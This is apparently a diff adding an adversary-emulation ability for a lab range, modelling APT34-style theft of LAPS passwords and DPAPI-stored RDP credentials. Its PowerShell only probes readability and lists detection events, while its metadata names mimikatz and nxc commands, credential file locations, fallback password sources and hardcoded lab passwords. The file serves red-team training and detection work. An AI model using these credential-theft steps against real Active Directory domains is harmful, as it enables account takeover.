@@ -1,0 +1,105 @@
+- name: 'APT34 - HOLLOW CROWN: LAPS Password Read and DPAPI Credential Vault Extraction (SRV11-JUMP)'
+  description: >-
+    Models credential extraction on the bastion server by chaining two techniques.
+    First, the operator reads the LAPS-managed local administrator password for
+    SRV11-JUMP from Active Directory using the svc_build account's delegated read
+    permission. Second, after authenticating as local administrator, DPAPI-protected
+    credential blobs stored in the svc_itadmin user profile are decrypted to recover
+    saved RDP credentials for DC03. This two-stage extraction mirrors real-world
+    attacks where LAPS provides initial access to a high-value host, and DPAPI
+    vaults on that host yield domain-level credentials. Detection opportunities
+    include LDAP queries for ms-Mcs-AdmPwd, local administrator logon to SRV11-JUMP
+    from an unexpected source, and DPAPI master key enumeration via LSASS access.
+  tactic: credential-access
+  technique_id: T1555.004
+  technique_name: 'Credentials from Password Stores: Windows Credential Manager'
+  singleton: false
+  repeatable: false
+  delete_payload: false
+  executors:
+  - name: psh
+    platform: windows
+    command: |-
+      $ErrorActionPreference = "SilentlyContinue"
+
+      Write-Host "[*] Scenario 4 preflight: LAPS + DPAPI path validation" -ForegroundColor Cyan
+
+      Write-Host "`n[*] Checking LAPS password readability" -ForegroundColor Yellow
+      $searcher = New-Object DirectoryServices.DirectorySearcher
+      $searcher.Filter = "(cn=SRV11-JUMP)"
+      $searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwd") | Out-Null
+      $searcher.PropertiesToLoad.Add("ms-Mcs-AdmPwdExpirationTime") | Out-Null
+      $result = $searcher.FindOne()
+      if ($result) {
+        $pwd = $result.Properties["ms-mcs-admpwd"]
+        if ($pwd -and $pwd.Count -gt 0) {
+          Write-Host "[+] LAPS password readable for SRV11-JUMP (value redacted)"
+        } else {
+          Write-Host "[!] LAPS attribute exists but not readable with current context"
+        }
+      } else {
+        Write-Host "[!] SRV11-JUMP computer object not found"
+      }
+
+      Write-Host "`n[*] Checking for DPAPI credential stores" -ForegroundColor Yellow
+      $profiles = @("svc_itadmin")
+      foreach ($p in $profiles) {
+        $credPath = "C:\Users\$p\AppData\Roaming\Microsoft\Credentials"
+        $localCredPath = "C:\Users\$p\AppData\Local\Microsoft\Credentials"
+        if (Test-Path $credPath) {
+          $blobs = Get-ChildItem $credPath -Force -ErrorAction SilentlyContinue
+          Write-Host "[+] Found $($blobs.Count) DPAPI blob(s) in $credPath"
+        }
+        if (Test-Path $localCredPath) {
+          $blobs2 = Get-ChildItem $localCredPath -Force -ErrorAction SilentlyContinue
+          Write-Host "[+] Found $($blobs2.Count) DPAPI blob(s) in $localCredPath"
+        }
+      }
+
+      Write-Host "`n[*] Checking RDP service state" -ForegroundColor Yellow
+      Get-Service TermService -ErrorAction SilentlyContinue |
+        Select-Object Name, Status, StartType |
+        Format-Table -AutoSize | Out-String | Write-Host
+
+      Write-Host "`n[*] Simulation complete (no LAPS password extracted, no DPAPI decrypted)" -ForegroundColor Cyan
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 180
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info:
+      target_host: SRV11-JUMP.cyberange.local
+      dc_host: DC03.cyberange.local
+      domain: cyberange.local
+      laps_reader:
+        username: svc_build
+        password: 'Bu1ld@cc#2025!'
+        read_method: 'nxc ldap DC03 -M laps OR DirectorySearcher for ms-Mcs-AdmPwd'
+      laps_target:
+        computer: SRV11-JUMP
+        attribute: ms-Mcs-AdmPwd
+        password_type: Randomized by LAPS GPO
+      dpapi_target:
+        profile_user: svc_itadmin
+        credential_location: 'C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Credentials'
+        master_key_location: 'C:\Users\svc_itadmin\AppData\Roaming\Microsoft\Protect'
+        decryption_tool: 'nxc --dpapi OR mimikatz dpapi::cred'
+      extracted_account:
+        username: svc_itadmin
+        password: '1tAdm!nSvc#2025'
+        description: IT admin account with WriteDACL on AdminSDHolder
+      contingencies:
+        C4a: 'AutoLogon registry — DefaultPassword for CorpAdmin local account'
+        C4b: 'PSReadline history — svc_itadmin password in ConsoleHost_history.txt'
+        C4c: 'Unattend.xml — Base64-encoded password in C:\Windows\Panther\'
+      detection_events:
+        - 'LDAP query for ms-Mcs-AdmPwd from svc_build'
+        - '4624 on SRV11-JUMP — Local admin logon type 3'
+        - 'Sysmon Event 10 — LSASS process access for DPAPI key extraction'
+        - '4688 on SRV11-JUMP — mimikatz or procdump execution'
+  requirements: []
+  id: d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9
